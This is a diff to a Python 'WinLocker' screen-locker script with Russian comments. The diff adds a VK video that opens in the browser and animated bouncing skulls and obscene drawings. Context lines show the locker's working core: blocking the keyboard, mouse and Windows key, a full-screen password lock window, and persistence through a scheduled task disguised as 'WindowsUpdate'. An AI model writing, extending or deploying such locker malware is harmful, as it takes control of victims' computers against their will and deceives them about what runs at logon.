@@ -1,15 +1,9 @@
-import ctypes
-import os
-import sys
-import time
-import threading
-import random
-import math
-import tkinter as tk
+import ctypes, os, sys, time, threading, random, math, webbrowser, tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
+VIDEO_URL = "https://vk.com/video-30602036_456293338"
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
@@ -37,6 +31,13 @@ def add_to_startup():
     command = f'python "{script_path}"'
     subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)
 
+# === ОТКРЫВАЕМ ВИДЕО ВК В БРАУЗЕРЕ ===
+def play_video():
+    try:
+        webbrowser.open(VIDEO_URL)
+    except:
+        pass
+
 # === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
 class WinLocker:
     def __init__(self):
@@ -62,6 +63,25 @@ class WinLocker:
         self.canvas.create_window(400, 360, window=self.entry)
         self.status = self.canvas.create_text(400, 420, text="", fill='white', font=('Courier', 20))
         
+        # Данные для летающих объектов
+        self.skulls = []
+        for _ in range(6):
+            self.skulls.append({
+                'x': random.randint(100, 700),
+                'y': random.randint(200, 500),
+                'dx': random.choice([-2, 2]),
+                'dy': random.choice([-2, 2])
+            })
+        
+        self.fucks = []
+        for _ in range(8):
+            self.fucks.append({
+                'x': random.randint(100, 700),
+                'y': random.randint(100, 500),
+                'dx': random.choice([-2, 2]),
+                'dy': random.choice([-2, 2])
+            })
+        
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
         self.animate()
@@ -78,14 +98,10 @@ class WinLocker:
     def draw_skull(self, x, y, laugh_frame):
         """Рисует ASCII-череп, который смеётся"""
         eye_h = 20 + (5 if laugh_frame % 10 < 5 else -5)
-        # Голова
         self.canvas.create_oval(x-40, y-30, x+40, y+30, outline='white', width=2)
-        # Глаза
         self.canvas.create_oval(x-20, y-15, x-10, y-5, fill='white')
         self.canvas.create_oval(x+10, y-15, x+20, y-5, fill='white')
-        # Нос
         self.canvas.create_polygon(x-10, y+5, x+10, y+5, x, y+15, fill='white')
-        # Рот (смеётся)
         if laugh_frame % 10 < 5:
             self.canvas.create_arc(x-30, y+10, x+30, y+50, start=200, extent=140, style='arc', outline='white', width=2)
         else:
@@ -102,17 +118,25 @@ class WinLocker:
         self.canvas.delete("skull")
         self.canvas.delete("fuck")
         
-        # Рисуем 5 черепов в случайных местах
-        for i in range(5):
-            x = random.randint(100, 700)
-            y = random.randint(200, 500)
-            self.draw_skull(x, y, int(time.time() * 10) + i)
+        # Обновляем и рисуем черепа
+        for skull in self.skulls:
+            skull['x'] += skull['dx']
+            skull['y'] += skull['dy']
+            if skull['x'] <= 40 or skull['x'] >= 760:
+                skull['dx'] *= -1
+            if skull['y'] <= 30 or skull['y'] >= 570:
+                skull['dy'] *= -1
+            self.draw_skull(skull['x'], skull['y'], int(time.time() * 10))
         
-        # Рисуем 3 "фака"
-        for i in range(3):
-            x = random.randint(100, 700)
-            y = random.randint(100, 500)
-            self.draw_fuck(x, y, int(time.time() * 10) + i)
+        # Обновляем и рисуем "факи"
+        for fuck in self.fucks:
+            fuck['x'] += fuck['dx']
+            fuck['y'] += fuck['dy']
+            if fuck['x'] <= 40 or fuck['x'] >= 760:
+                fuck['dx'] *= -1
+            if fuck['y'] <= 30 or fuck['y'] >= 570:
+                fuck['dy'] *= -1
+            self.draw_fuck(fuck['x'], fuck['y'], int(time.time() * 10))
         
         # Мерцание главной надписи
         if random.random() < 0.1:
@@ -129,5 +153,6 @@ if __name__ == "__main__":
     time.sleep(TIMER_SECONDS)
     block_input(True)
     threading.Thread(target=block_win_key, daemon=True).start()
+    threading.Thread(target=play_video, daemon=True).start()
     app = WinLocker()
     app.root.mainloop()
